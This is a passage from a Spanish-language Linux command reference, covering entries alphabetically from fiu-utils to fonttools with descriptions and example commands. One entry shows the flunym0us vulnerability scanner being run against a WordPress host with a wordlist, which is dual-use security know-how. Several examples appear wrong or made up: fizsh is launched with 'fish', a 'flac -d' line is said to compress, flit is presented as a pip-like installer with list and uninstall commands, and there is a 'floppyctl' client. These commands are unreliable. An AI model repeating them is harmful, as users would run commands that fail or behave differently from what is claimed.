       > omf -h (información, incluidos todos los comandos)
       > exit (salir)


fiu-utils
Marco de inyección de fallos en el espacio de usuario. útil para probar cómo se comportan los programas ante errores como fallos de asignación de memoria, errores de E/S, entre otros. Este paquete contiene las utilidades fiu-run [ejecuta un programa con fallos inyectados], fiu-ls [muestra los puntos de fallo activos en un proceso en ejecución] y fiu-ctrl [controla la inyección de fallos en procesos que ya están en ejecución].
$ fiu-run -c "enable name=posix/malloc, probability=0.25" -- ./mi_programa (activa fallos en malloc() con una probabilidad del 25% y ejecuta mi_programa con la inyección de fallos)
$ fiu-run -c "enable name=posix/open, probability=0.5" -- ./mi_programa (simular fallos en la apertura de archivos [open] con una probabilidad del 50%)
$ fiu-ls -p 1234 (permite ver los puntos de fallo activos en un proceso en ejecución)
1.-
Controlar fallos en procesos en ejecución
Supongamos que mi_programa ya está corriendo con PID=1234. Podemos inyectar fallos en malloc() con:
$ fiu-ctrl -c "enable name=posix/malloc, probability=0.5" -p 1234
Para desactivar el fallo en malloc() en ese proceso:
$ fiu-ctrl -c "disable name=posix/malloc" -p 1234


fixfiles
[selinux]. Este script se utiliza principalmente para corregir la base de datos del contexto de seguridad en los sistemas de archivos. También se puede ejecutar en cualquier momento para reetiquetar cuando se agregue soporte para una nueva política, o simplemente para comprobar si los contextos de los archivos son los esperados.  Por defecto reetiquetará todos los sistemas de ficheros ext2, ext3, xfs y jfs montados, siempre y cuando no tengan una opción de montaje en el contexto de seguridad. El fichero /etc/selinux/fixfiles_exclude_dirs puede contener una lista de directorios excluidos del reetiquetado. De manera más general, los programas iniciados por scripts init pueden no funcionar correctamente. Este problema se debe generalmente al etiquetado incorrecto de uno o más scripts de init. Puede reetiquetar los scripts emitiendo el comando fixfiles.
$ fixfiles restore


fixparts
[gdisk]. Repara ciertos tipos de problemas con la partición Master Boot Record (MBR). Puede eliminar datos de la tabla de particiones GUID (GPT), que se pueden dejar en un disco que alguna vez se usó como disco GPT, puede reparar particiones extendidas de tamaño incorrecto, ya sea particiones que se extiendan más allá del extremo físico del disco o que se superpongan con particiones primarias cercanas y tambien puede cambiar las particiones primarias en particiones lógicas o viceversa.
# fixparts /dev/sda


fizsh
Es una interfaz para Zsh. Ofrece resaltado de sintaxis interactivo, una función de búsqueda de historial similar a la de Matlab y admite la sintaxis Bourne.
$ fish


fkill
Matar procesos de forma interactiva. Descarga <https://github.com/sindresorhus/fkill-cli>
$ fkill
Una vez mostrada la salida, empezar a teclear el nombre de la aplicación y cuando aparezca, al pulsar intro se cerrará.
Otras formas de uso:
$ fkill 54377 (por el pid del proceso)
$ fkill chromium (por nombre directamente de la aplicación a cerrar)
$ fkill :5050 (por numero de puerto)


fl-cow
Herramienta que utiliza un mecanismo conocido como Copy-On-Write [COW - copia al escribir] para gestionar archivos con enlaces físicos [hard links]. Normalmente, cuando se tiene archivos enlazados físicamente y se modifica uno de ellos, el cambio afecta a todos los enlaces porque apuntan al mismo contenido en disco. Sin embargo, fl-cow interviene para que, en lugar de sobrescribir el archivo original, se cree una copia del archivo modificado, preservando así la versión original y ahorrando espacio en disco al aprovechar los enlaces físicos.
1.-
Ejemplo práctico, suponiendo un archivo llamado original.txt y crear un enlace físico:
$ echo "Este es el contenido original" > original.txt
$ ln original.txt copia.txt
Si se edita copia.txt y se modifica tambien se modifica original.txt porque ambos son el mismo archivo en disco
$ fl-cow copia.txt
$ echo "Contenido modificado" > copia.txt
El resultado ahora sera que original.txt contendra el mismo contenido ["Este es el contenido original"] y copia.txt contendrá "Contenido modificado"


flac
[Free Lossless Audio Codec]. Códec de audio similar a MP3, pero sin pérdida para codificar y decodificar archivos FLAC. Incluye la aplicación metaflac para manipular metadatos FLAC
$ flac archivo.wav (comprimir archivo)
$ flac --decode archivo.flac salida.wav (descomprimir archivo)
$ flac -d input.wav -o utput.flac (comprimir .wav sin eliminar el archivo de entrada)
$ flac --decode --verify input.flac output.wav (descomprimir un archivo FLAC con verificación)
$ flac --compression-level=5 input.wav -o utput.flac (comprimir con un nivel de compresión específico)
$ metaflac --list input.flac (extraer metadatos de un archivo FLAC)
$ metaflac --set-title="Mi canción favorita" input.flac (añadir metadatos a un archivo FLAC)


flactag
Etiquetador para archivos FLAC [Free Lossless Audio Codec] de álbumes completos con datos de MusicBrainz y generalmente acompañados de una hoja de cues [CUE sheet] incrustada. Los datos para las etiquetas, como título del álbum, artista, pistas, etc. se descargan de MusicBrainz, una base de datos abierta de música.
$ flactag -c album.flac (mostrará si las etiquetas actuales coinciden con las de MusicBrainz o si hay diferencias)
$ flactag -w album.flac (si las etiquetas difieren, se escribirán las nuevas)
$ flactag -w -f album.flac (forzar la escritura incluso si parecen iguales)
$ flactag -w -r album.flac (etiquetar y renombrar album.flac según la plantilla definida en ~/.flactag)
Nota.- La plantilla por defecto podría ser algo como %A/%T/%D-%E (artista/álbum/disco-extensión), pero se puede personalizar en el archivo de configuración.
$ flactag -d album.flac (ver el ID del disco calculado para album.flac)
$ flactag album.flac (abrirá una interfaz donde se puede navegar con las teclas de flecha para elegir el álbum correcto en MusicBrainz)
Nota.- El archivo de configuración ~/.flactag se crea la primera vez que se usa el programa.


flake
herramienta que se utiliza para codificar audio en formato FLAC, pero con algunas mejoras adicionales como aumentar la velocidad de codificación e implementar funciones experimentales.
$ flake input.wav output.flac (codificar un archivo de audio a FLAC)
$ flake --compression-level=5 input.wav output.flac (opciones avanzadas como el nivel de compresión)


flameshot
Herramienba de captura de pantalla. De forma predeterminada, Flameshot se ejecuta en segundo plano y añade un icono en la bandeja del sistema para su configuración.
$ flameshot screen (captura la pantalla completa y la guarda en ~/Imagenes
$ flameshot full (captura todo el escritorio)
$ flameshot launcher (abre el lanzador de captura)
$ flameshot gui (inicia la captura manual en modo GUI)
$ flameshot config (abre la GUI de la configuración)


flamethrower
Diseñado para ser un sistema de distribución de archivos multidifusión [multicast] que es un método de transmisión donde un paquete de datos se envía una sola vez desde el origen, pero es recibido por múltiples destinos simultáneamente,  lo que lo hace especialmente útil para escenarios donde se necesita enviar datos a múltiples dispositivos en una red, como despliegues de software, imágenes de disco, o actualizaciones simultáneas.
$ flamethrower -send -file /ruta/al/archivo.iso -group 224.1.1.1 -port 5000 (enviar un archivo .iso al grupo multicast [debe estar en el rango 224.0.0.0/4] y el puerto)
$ flamethrower -receive -file /destino/archivo.iso -group 224.1.1.1 -port 5000 (los clientes ejecutan esto para unirse al grupo multicast y recibir el archivo)
$ flamethrower -checksum -file /destino/archivo.iso (compara el hash MD5 del archivo recibido con el original para detectar corrupción)


flamp
Aplicación utilizada por radioaficionados para transmitir archivos mediante el Amateur Multicast Protocol (AMP). Este protocolo permite enviar datos de manera eficiente a múltiples receptores en redes de radioaficionados, aprovechando la capacidad de transmisión en multicast. Es especialmente útil en situaciones donde se necesita distribuir información a varios operadores simultáneamente, como en emergencias o actividades grupales. El operador debe configurar su estación de radio y asegurarse de que todos los receptores estén sintonizados en la misma frecuencia.
$ flamp --send archivo.txt (inicia la transmisión del archivo archivo.txt)


flash
[Fast Length Adjustment of SHort reads]. Herramienta bioinformática para fusionar pares de lecturas de secuenciación cuando los fragmentos de ADN originales son más cortos que el doble de la longitud de las lecturas. Las lecturas más largas resultantes pueden mejorar significativamente el ensamblaje del genoma. También pueden mejorar el ensamblaje del transcriptoma cuando FLASH se utiliza para fusionar datos de secuenciación de ARN.
$ flash reads_R1.fastq reads_R2.fastq (fusionar dos archivos FASTQ con lecturas pareadas)
Nota.- Los archivos generados serán out.extendedFrags.fastq [Lecturas fusionadas con éxito], out.notCombined_1.fastq, out.notCombined_2.fastq [Lecturas que no se pudieron fusionar.] y [prefijo].hist y [prefijo].histogram [Estadísticas sobre la distribución de solapamientos].
$ flash -m 15 -M 30 -o merged_reads reads_R1.fastq reads_R2.fastq (requiere al menos 15 bases de solapamiento, limita el solapamiento máximo a 30 bases y los archivos de salida tendrán el prefijo merged_reads)
La salida constará de merged_reads.extendedFrags.fastq que contendrá las lecturas fusionadas [longitud aproximada de 180 bases] y las lecturas no fusionadas estarán en merged_reads.notCombined_1.fastq y merged_reads.notCombined_2.fastq.
$ flash -t 4 -o merged reads_R1.fastq reads_R2.fastq (con un equipo con múltiples núcleos,acelerar el proceso con 4 hilos)
$ flash -o merged reads_R1.fastq reads_R2.fastq (fusionar lecturas)


flashbench
Esta utilidad ayuda a identificar las propiedades de las tarjetas SD y el almacenamiento flash asi como descubrir el tamaño de las páginas y segmentos, velocidades de lectura y escritura en diferentes condiciones y el número máximo de segmentos abiertos simultáneamente
# flashbench --all /dev/sdb (realizará una serie de pruebas para determinar la estructura del almacenamiento)
# flashbench --random-write --repeat=5 /dev/sdb (escribe datos aleatorios en el dispositivo 5 veces y muestra los resultados de rendimiento)
# flashbench --size=4K /dev/sdb (ayuda a encontrar el tamaño de escritura óptimo para un mejor rendimiento)
# flashbench --auto /dev/sdb (probará varias combinaciones y dará recomendaciones)
Nota.- flashbench escribe datos en el dispositivo especificado por tanto no ejecutarlo en un dispositivo con datos importantes, ya que puede sobrescribir información.


flashrom
Es una herramienta para identificar, leer, escribir, verificar y borrar chips de memoria flash. Se utiliza a menudo para flashear imágenes de BIOS/EFI/coreboot/firmware/optionROM en el sistema mediante una placa base compatible. También permite flashear tarjetas de red NIC, tarjetas controladoras SATA y otros dispositivos externos que permiten programar chips flash.
# flashrom --list-supported (ver chips soportados)
# flashrom --programmer internal (Detectar el chip flash usando el controlador SPI integrado en la placa base, común para actualizar BIOS)
Una salida podría ser:
      Found chip "Winbond W25Q128FV" (16384 kB, SPI).
# flashrom --programmer internal -r bios_backup.bin (lee el contenido del chip y lo guarda en bios_backup.bin)
# flashrom --programmer internal -w new_bios.bin (escribe el archivo new_bios.bin en el chip)
Nota.- Si el proceso falla, el dispositivo puede quedar inutilizable ["bricked"].
# flashrom --programmer internal -v new_bios.bin (verificar después de escribir comparando el contenido del chip con el archivo new_bios.bin)
# flashrom --programmer internal -E (borrar todo el contenido del chip [requiere reprogramación posterior])
# flashrom --programmer ch341a_spi -r backup.bin (con un programador SPI externo conectado por USB común en adaptadores baratos)


flatpak
Instalar, obtener, administrar y ejecutar paquetes de aplicaciones, alojadas en flathub, lugar central de aplicaciones linux. Para habilitar flathub lanzar en una terminal:
# flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
Reiniciar el sistema y ya podran usarse los argumentos especificos que procedan.
$ flatpak update (actualizar las aplicaciones)
$ flatpak list (listar aplicaciones instaladas)
$ flatpak history (mostrar historial)
$ flatpak config (lenguajes configurados)
$ flatpak repair (reparar la instalación de flatpak)
$ flatpak info (mostrar información de una aplicacion instalada)
$ flatpak uninstall paquete (desinstalar una aplicacion)
$ flatpak search paquete (buscar apliaciones)
$ flatpak kill aplicacion (detener una aplicación flatpak en ejecución)
$ flatpak ps (ver las aplicaiones faltpak ejecutándose)
$ flatpak run aplicacion (ejecutar una aplicación flatpak)


flatzinc
es un lenguaje de modelado de bajo nivel diseñado para problemas de restricciones. Es una representación simplificada de MiniZinc que facilita la interacción con solucionadores de restricciones como Gecode.
$ minizinc -c model.mzn data.dzn (produce un archivo FlatZinc [model.fzn] que puede ser utilizado por solucionadores compatibles con este formato)
$ fzn-gecode model.fzn (ejecutar el modelo FlatZinc con un solucionador)


flawfinder
Explora el código fuente de C/C++ en busca de posibles vulnerabilidades de seguridad y genera un informe que describe las posibles fallas encontradas, clasificándolas según su posible gravedad.
$ flawfinder -v *.c *.cpp (analizará todos los archivos .c y .cpp en el directorio actual en modo verbose)
$ flawfinder -v --exclude=EX1:0 *.c (excluir ciertos patrones de vulnerabilidad)


fldiff
Programa de comparación de archivos que muestra las diferencias entre dos archivos o directorios, o entre un archivo o directorio y un repositorio CVS o Subversion.
$ fldiff archivo1.txt archivo2.txt (mostrará las diferencias)


flent
[FLExible Network Tester]. Herramienta de prueba de red versátil diseñada para evaluar el rendimiento de la red y la saturación de búferes. Es un envoltorio de Python que simplifica la ejecución simultánea de múltiples instancias de herramientas de pruebas de red populares como netperf, iperf y ping. flent agrega los resultados de estas pruebas y genera gráficos informativos
$ flent tcp_ndown -H <servidor> -t 60 (ejecuta una prueba de descarga TCP de 60 segundos contra el servidor especificado)
$ flent rrul -H <servidor> -t 60 (prueba de latencia bidireccional de 60 segundos contra el servidor especificado)
$ flent tcp_ndown -H <servidor> -l 60 -p "bufferbloat" (prueba de descarga TCP de 60 segundos contra el servidor especificado y mide la saturación de búfer)
$ flent tcp_ndown -H <servidor> -t 60 --multipath (ejecuta una prueba de descarga TCP de 60 segundos contra el servidor especificado utilizando múltiples flujos)
$ flent tcp_ndown -H <servidor> -t 60 -o prueba.png (ejecuta una prueba de descarga TCP de 60 segundos contra el servidor especificado y guarda los resultados en un archivo de imagen llamado "prueba.png")


flex
Herramienta utilizada para generar analizadores léxicos o escáneres que son parte de un compilador o intérprete que se encarga de leer el código fuente y dividirlo en "tokens" o símbolos léxicos. Estos tokens son las unidades básicas de significado en el lenguaje de programación, como palabras clave, identificadores, literales, operadores, etc.
$ flex example.l (generará un archivo C llamado lex.yy.c a partir del archivo especificado)
$ gcc lex.yy.c -o example -lfl (compilar el archivo lex.yy.c y generará un ejecutable llamado example)


flexget
[python2.6 python-pip]. Descarga de series a partir de su direccion RSS. Archivo de configuración:
$ nano .flexget/config.yml
Con un contenido parecido a:
	presets:
	  tv:
	    series:
	      settings:
		hdtv:
		  timeframe: 8 hours
	      hdtv <720p:
		- serie 1
		- serie 2
		- serie 3
		- etc
	    content_filter:
	      require:
		- '*.avi'
	    download: "/media/discoext/Descargas/Torrents"
	tasks:
	  TvTorrent1:
	    rss: http://showrss.karmorra.info/feeds/all.rss
	    preset: tv
$ flexget --test (Comprobar si la configuración es correcta)
$ flexget (Lanzar la aplicación)


flexloader
es una pequeña utilidad para configurar dispositivos FPGA de Altera [ahora Intel FPGA] basados en SRAM como las series antiguas, por ejemplo, los chips FLEX de Altera o ACEX. Estos dispositivos requieren una configuración externa cada vez que se encienden, ya que no retienen su configuración de forma permanente a diferencia de los basados en flash.
$ flexloader -d /dev/ttyUSB0 -f config.rbf (especifica el puerto serie USB conectado a un cable de programación y el archivo de configuración [.rbf, Raw Binary File o .sof, SRAM Object File] que se cargará en la FPGA)
$ flexloader -j -f hardware.rbf (-j indica que se usará JTAG para la configuración)
$ flexloader --scan (lista los dispositivos FPGA detectados en la cadena JTAG)
$ flexloader -d /dev/ttyS0 -b 115200 -f firmware.rbf (establece la velocidad en baudios para comunicación serial)


flickcurl
Biblioteca en C para la API de Flickr que permite interactuar con la API de Flickr para administrar fotos, álbumes y otras funciones del servicio. También incluye el programa flickrdf para convertir metadatos de fotos, etiquetas y descripciones RDF de fotos y etiquetas. Una vez se tiene la API key se entra en el archivo de configuración:
$ nano ~/.flickcurl.conf
       api_key=TU_API_KEY
       api_secret=TU_API_SECRET
$ flickcurl -a (redirigirá a Flickr para aprobar la aplicación y obtener un token de acceso)
$ flickcurl people.findByUsername "nombre_de_usuario" (devolverá el ID del usuario en Flickr)
$ flickcurl photos.search user_id="123456@N01" (listar las fotos públicas de un usuario)
$ flickcurl photos.getInfo 1234567890 (devolverá datos como el título, descripción, etiquetas, etc del ID de una foto)
$ flickcurl upload "mi_foto.jpg" --title "Vacaciones 2025" --description "Foto en la playa" --tags "playa verano" (subir una imagen)
$ flickcurl photosets.create "Mi Álbum de Viaje" "Descripción del álbum" 1234567890 (crear un álbum. El último número es el ID de una foto que será la portada del álbum)
$ flickcurl photosets.addPhoto 987654321 1234567890 (agregar fotos al álbum donde 987654321 es el ID del álbum y 1234567890 es el ID de la foto)


flightcrew
Validador de epub que la interfaz gráfica Sigil [editor de libros electronicos] utiliza para validar archivos epub y puede ser útil para otras utilidades de creación de epub.
$ flightcrew --verbose libro.epub (forma básica)
$ flightcrew --quiet libro.epub (salir sin mostrar errores, solo advertencias)
$ flightcrew libro1.epub libro2.epub libro3.epub (verificar múltiples archivos EPUB)


fling
Transfiere datos desde la entrada estándar [stdin] hacia un destino a través a través de la red, sin cifrar los datos durante el proceso.
$ cat archivo.txt | fling 192.168.1.10 (transferir datos a un servidor de destino)
$ cat archivo.txt | fling -p 8080 192.168.1.10 (por un puerto específico)
$ fling -r 8080 (indica que se escuche en el puerto 8080 para recibir datos)


flintqs
Programa que utiliza la criba cuadrática multipolinómica [Multi-Polynomial Quadratic Sieve - MPQS] para factorizar enteros grandes de al menos cuarenta dígitos y se utiliza principalmente en el campo de la criptografía y la teoría de números, dado que muchos sistemas de seguridad, como RSA, dependen de la dificultad de factorizar grandes números primos.
$ flintqs -v 123456789012345678901234567890123456789 (intentar factorizar el número y ver salida detallada)


flip
Convierte los finales de línea de archivos de texto entre formatos MS-DOS [Carriage Return + Line Feed - CRLF] y *nix [LF] y los ignora si ya tienen el formato correcto.
$ flip -u archivo.txt (convertirá el final de línea de `archivo.txt` de CRLF a LF)
$ flip -t -m archivo.txt (convertirá el final de linea de LF a CRLF conservando  las marcas de tiempo)
$ file archivo.txt (comprobar formato de los finales de linea)
       archivo.txt: Unicode text, UTF-8 text, with very long lines (847), with CRLF line terminators


flit
[Fast Lightweight Installer Tool]. Forma sencilla y más rápida que pip de instalar paquetes y módulos de Python desde PyPI [PEP 517]
$ flit install requests (instalar el paquete "requests")
$ flit install numpy pandas matplotlib (instalar varios paquetes)
$ flit list (mostrar todos los paquetes instalados usando flit)
$ flit uninstall pandas (desinstalar un paquete)
$ flit update (actualizar todos los paquetes instalados con flit)


floatbg
Modifica sutilmente el color de la ventana raíz X tan lentamente que no se nota.
$ floatbg -c "#0000FF" (cambiar el fondo a un tono azulado)
$ floatbg -t 5 -n (ajustar el tiempo de transición y no cambia el fondo cuando la ventana está oculta)
$ floatbg -m "#00FF00" (cambiar el color al hacer clic)
$ floatbg -c "rgb(255, 165, 0)" (usar colores RGB)
$ floatbg -c "#FF0000" -t 10 -m "#00FF00" (combinar opciones)


flog
[File LOGger - registrador de archivos]. Escribe la entrada estándar [STDIN] a un archivo y reabre el archivo cuando recibe una señal [SIGHUP] similar a sponge [ver]
$ echo "Hola mundo" | flog archivo.txt (el contenido se escribirá en archivo.txt y luego el programa se cerrará sin embargo, el archivo seguirá abierto y listo para futuras escrituras)


floppyd
Un demonio que se utiliza como servidor para otorgar acceso a la disquetera local a clientes de máquinas remotas, que tambien han de tener instalada la aplicación y, una vez conectados, pueden leer y escribir archivos en el dispositivo de disco flexible. Una configuración básica en el servidor podría ser:
# nano /etc/floppyd.conf
        floppy=/dev/fd0
        port=12345
# floppyd (iniciar el servidor)
$ floppyctl connect localhost 12345 (conectar al servidor des de la máquina remota)


flowgrind
Herramienta de medición del rendimiento y otras métricas TCP [red distribuida] similar a iperf y netperf. Su objetivo principal es ayudar a medir la capacidad de una red en términos de latencia, ancho de banda y otros parámetros importantes relacionados con el tráfico TCP, y esto se logra mediante la generación de tráfico TCP en ambas direcciones (cliente y servidor).
1.-
$ flowgrind -s 5001 (indica que el proceso se ejecutará en modo servidor, y el puerto en el que el servidor escuchará las conexiones de los clientes)
$ flowgrind -c <dirección_del_servidor> -p 5001 (conectar al servidor y realizar la prueba de rendimiento)
2.-
$ flowgrind -s 5001 -t tcp (ejecutar en modoservidor, puerto y medir el ancho de banda de la red entre el cliente y el servidor)
$ flowgrind -c <dirección_del_servidor> -p 5001 -t tcp (en el cliente especificando que se usará TCP como protocolo de transporte)
3.-
$ flowgrind -s 5001 -T 10 (probar con 10 flujos TCP simultáneos)
$ flowgrind -c <dirección_del_servidor> -p 5001 -b 1400 (configurar paquetes de 1400 bytes)


flunym0us
Pruebas de vulnarabilidad de webs basadas en wordpress. Descarga http://code.google.com/p/flunym0us/downloads/list
$ flunym0us -H http://host -w /home/usuario/wordlist -wp -t 60 -r 1 -p 2 -T 2
Opciones:
	-wp (Scanear un sitio wordpress)
	-mo (scanear un sitio Moodle)
	-H http://host (Nombre del host wordpress a scanear)
	-w /home/usuario/wordlist (Ruta al diccionario)
	-t 60 (Tiempo de espera)
	-r 1 (Reintentos de conexión)
	-p 2 (Numero de procesos)
	-T 2 (Número de subprocesos simultaneos por proceso)


fluster
Marco de pruebas que ejecuta varias suites [velocidad, eficiencia, compatibilidad...] para la conformidad de decodificadores multimedia compatibles [codecs]. Originalmente, se diseñó para comprobar la conformidad de los decodificadores H.265/HEVC, pero también es compatible con H.264/AVC y verifica si un decodificador, por ejemplo, ffmpeg, GStreamer, libde265, interpreta correctamente los archivos codificados bajo un estándar.
$ fluster --list-tests (muestra todas las suites de pruebas incluidas)
$ fluster --test-set HEVC --decoder /usr/bin/ffmpeg --output results.txt (selecciona la suite de pruebas para HEVC, el decodificador a probar, en este caso, ffmpeg y guardar resultados)
$ fluster --test-set AVC --decoder /usr/bin/gst-launch-1.0 (usar gst-launch-1.0 de GStreamer como decodificador)
$ fluster --test-set HEVC --test-case JCTVC_C004 --decoder /usr/bin/ffmpeg (ejecutar una prueba específica)


flwrap
Herramienta de escritorio que encapsula un archivo de texto, un archivo de imagen o un archivo binario dentro de un formato especial que incluye bloques de identificación y una suma de verificación [checksum] de 16 bits. Esto es especialmente útil en el ámbito de la radioafición y las comunicaciones digitales.
$ flwrap mensaje.txt (encapsular el archivo creando mensaje.txt.flw)
$ flwrap imagen.jpg (encapsular un archivo de imagen generando imagen.jpg.flw)
$ flwrap mensaje.txt.flw (desencapsular un archivo .flw y extraer el archivo original generando mensaje.txt)


fluxbox-generate_menu
Generador de menús de fluxbox.
$ fluxbox-generate_menu -g (Añade un menú tipo gnome)
$ fluxbox-generate_menu -k -o ~/.fluxbox/menu1 (Añade menú tipo kde y lo coloca en menu1 para probarlo. Sin especificar, substituiría el .fluxbox/menu)


flvmeta
Herramienta de línea de comandos diseñada para manipular metadatos en archivos de vídeo FLV [FLash Video]. Su función principal es inyectar etiquetas de metadatos estándar en el evento onMetaData y agregar un evento onLastSeconde.
$ flvmeta input.flv output.flv --add-metadata --on-last-second (archivo FLV de entrada, archivo FLV modificado con metadatos, ynyecta metadatos estándar en onMetaData e inserta el evento onLastSecond.)


flvstreamer
Descarga de videos con protocolo RTMP.
Supongamos que el video a descargar tenga por ruta: http://www.tv3.cat/videos/1307049732092
Abrir una pestaña del vavegador y pegar:
http://www.tv3.cat/su/tvc/tvcConditionalAccess.jsp?ID=1307049732092&QUALITY=H&FORMAT=MP4
Colocando en el número “ID=” el que corresponda y con la ruta rtmp que nos indique lanzar [en una sola linea]:
$ flvstreamer -r rtmp://mp4-500-str.tv3.cat/ondemand/mp4:g/tvcatalunya/2/9/1307049732092.mp4 -o video.mp4


fmt
Eliminar saltos de linea de un archivo y uniendo párrafos.
$ fmt -w 80 fichero.txt (limitando el número de caracteres por linea)
$ fmt -s 10 fichero.txt (solo une las lineas inferiores a 10 caracteres)


fmtools
Sintonizador de radio FM para ajustar frecuencias, volumenes, silenciar y activar el sonido de las tarjetas de radio FM.
$ fm on (activa el radio si existe)
$ fm off (desactivar)
$ fmscan -d dispositivo (escanear frecuencias, si dispositivo no se especifica, por defecto /dev/radio0)
$ fm 101500000 (si el dispositivo existe sintonizará la frecuencia especificada [101.5MHz especificada en KHz])
$ fm + (aumentar el volumen)
$ fm - (disminuir)


fnotifystat
Programa que vuelca la actividad del sistema de archivos en un período de tiempo determinado. Se puede utilizar para identificar la actividad de determinados archivos y descubrir qué procesos están realizando operaciones de apertura, cierre, lectura y escritura en los archivos.
# fnotifystat -D -T (ordenar estadisticas por dispositivo único y mostrando la fecha)
# fnotifystat -p 16755 (solo muestra archivos tocados por el proceso pid mencionado)
# fnotifystat -c -i /proc (volcar totales acumulados y especificar evento)
# fnotifystat -n -i /sys,/proc (especificando 2 procesos y sin estadísticas)
Algunas opciones:
	-d (quitar la ruta completa del directorio de los nombres de archivo)
	-h (muestra ayuda)
	-l (estadísticas por dispositivo único e inodo)
	-P (ordenar las estadísticas por pid, totales y nombre de archivo)
	-s (deshabilita la escala de los conteos de archivos)
	-t (solo muestra los archivos más activos)
	-v (modo detallado)


fnt
Buscar, obtener vista previa y descargar más de 1800 fuentes de los repositorios de fuentes web de Debian y Google.
$ fnt update (actualizar el listado)
$ fnt list (listar)
$ fnt search comic (buscar las "comic")
$ fnt preview agave (visualizar "agave)
# fnt install agave (instalar una concreta)


fntsample
Generador de ejemplos de fuentes que permite visualizar si determinada letra incluye el tipo de grafía que requiere nuestro locale (acento, geminada...)
$ fntsample -f .fonts/3Dumb.ttf -o 3Dumb.pdf (Especificando la fuente y el archivo para la salida)
$ fntsample -f ../.fonts/Hack-Regular.ttf -d ../.fonts/Hack-Italic.ttf -o diferencias_italic_regular.pdf (ver diferencias entre dos fuentes)


fold
Formatea la salida de un archivo a una determinada longitud.
$ fold archivo (a 80 caracteres por linea. Por defecto)
$ fold  -w 100 -s archivo (100 caracteres por linea y que corte por los espacios entre palabras y no por las palabras)


fomp
Colección de plugins de audio LV2 [MCP, VCO, FIL y WAH] y consta de 13 plugins en total: 1 auto-wah, 1 ecualizador, 3 coros, 5 filtros y 3 osciladores y, generalmente, se encuentran en el directorio /usr/lib/lv2 o /usr/local/lib/lv2, pero si estan en una carpeta personalizada, ha de indicarse al sistema donde se tienen que buscar.
$ nano ~/.bashrc
Y añadir la linea:
         export LV2_PATH=$LV2_PATH:$HOME/mis_plugins_lv2
Reiniciar la sesión o actualizar el archivo [source ~/.bashrc] y cualquier aplicación de música [VLC, audacity, ardour...] reconocerá los plugins LV2. Tambien se puede usar, para ver si los plugins están siendo correctamente cargados, los paquetes de la colección lilv-utils [ver]:
$ sudo lv2ls -n


fondu
Conversión entre formatos de fuentes de Macintosh a formatos más comunes en sistemas UNIX, como PFB [PostScript Type 1], TTF [TrueType], OTF [penType] y BDF [Bitmap Distribution Format]. Los sistemas Mac tradicionalmente almacenan fuentes en un formato especial que incluye un "resource fork" [fork de recursos], algo que no es nativo en otros sistemas operativos como UNIX/Linux. fondu extrae estas fuentes del "resource fork" y las convierte a formatos utilizables en entornos UNIX. Incluye un programa complementario llamado ufond, que hace lo inverso: toma fuentes en formatos UNIX y las convierte a un formato compatible con Mac.
$ fondu fuente.bin (extraerá las fuentes del "resource fork" y generará archivos como NombreFuente.ttf o NombreFuente.pfb en el directorio actual)
$ fondu fuente.hqx (se obtendrá archivos como NombreFuente.ttf, NombreFuente.otf o NombreFuente.bdf, según el contenido del archivo)
$ fondu fuente.dfont (si el archivo contiene fuentes TrueType, generará un archivo como NombreFuente.ttf)
$ fondu -latin1 fuente.bin (generará un archivo NombreFuente.bdf con codificación ISO 8859-1)
$ fondu -trackps fuente.bin (si el archivo contiene un recurso FOND que referencia fuentes PostScript externas se intentará abrir y convertir los archivos PostScript referenciados, generando archivos .pfb)
$ ufond -macbinary Helvetica.ttf (genera un archivo MacBinary con la fuente envuelta en un "resource fork")
Nota.- fondu es ideal para fuentes antiguas de Mac. Para fuentes modernas o conversiones más complejas, herramientas como fontforge podrían ser más adecuadas.


fontconfig
Biblioteca de configuración y personalización de fuentes que no depende del sistema X Window. Está diseñada para localizar fuentes dentro del sistema y seleccionarlas según los requisitos especificados por las aplicaciones.
$ fc-cache -f -v (actualizar la caché de fuentes)
$ fc-list (listar las fuentes instaladas)
$ fc-match (probar reglas de coincidencia)
$ fc-cat (volcar los archivos binarios de la caché en formato de cadena)
$ fc-scan /usr/share/fonts/truetype/freefont/ (escanear archivos o directorios de fuentes)
$ fc-scan -b /usr/share/fonts/truetype/gentium/Gentium-I.ttf (muestra las caracteristicas de la fuente mencionada)
$ fc-validate /usr/share/fonts/X11/100dpi/helvB18.pcf.gz (si es apta para el idioma del sistema)
$ fc-conflist (enumerar los archivos de configuración procesados por Fontconfig)
$ fc-pattern -d (analizar y mostrar patrones)
$ fc-query -b /usr/share/fonts/X11/100dpi/helvB18.pcf.gz (consultar archivos de fuentes e ignorar espacios en blanco al calcular idiomas)


fontcustom
Herramienta que convierte iconos en formato SVG en fuentes de iconos [icon fonts] compatibles con navegadores web.
Suponiendo un directorio con los iconos en SVG [icons/]
$ fontcustom compile icons/ --output=fonts/ --name="my-icons" --css-selector=.icon-{{glyph}} (generará fuentes en fonts/my-icons.{ttf,woff,eot,svg}, CSS en fonts/my-icons.css y HTML de demo en fonts/my-icons-preview.html)


fontmake
Esta biblioteca proporciona un contenedor para varias bibliotecas de Python que, en conjunto, compilan de diversas fuentes tipográficas desde formatos de diseño como .glyphs o el formato abierto .ufo [Unified Font Object] hacia formatos binarios como .otf [OpenType] y .ttf [TrueType]. Lo que hace especial a fontmake es que integra varias bibliotecas de Python, como glyphsLib, ufo2ft, fontTools, entre otras, para automatizar y simplificar este proceso de conversión.
$ fontmake -g MiFuente.glyphs -o otf ttf (especifica el archivo .glyphs como entrada e indica que se generará tanto .otf como .ttf de salida)
$ fontmake -g MiFuente.glyphs -o ttf -i (solo generar archivos .ttf e interpola y genera todas las instancias definidas en el archivo .glyphs)
$ fontmake -g MiFuente.glyphs -o variable (genera una fuente variable en formato .ttf con curvas TrueType)
$ fontmake -u MiFuente.ufo -o otf (especifica un archivo .ufo como entrada y genera un archivo .otf)
$ fontmake -g MiFuente.glyphs -o ttf --output-dir ./fuentes_generadas (que todos los archivos .ttf generados se guardarán en el directorio fuentes_generadas)


fonts-3270
Fuente monoespaciada basada en terminales IBM 3270 que fue copiada a mano de una de esas terminales. Su uso recomendado es, obviamente, una terminal de texto, igual que hace casi medio siglo. Se muestra con los nombres IBM 3270, IBM 3270 Condensed y IBM 3270 Semi-Condensed.


fonts-roadgeek
Conjunto de fuentes que replica los tipos de letra utilizados en las señales de carretera en varios países.


fonttools
Convierte fuentes OpenType y TrueType a XML para facilitar su análisis o edición. Incluye las aplicaciones fonttools [uso en scripts python], pyftmerge, pyftsubset y ttx
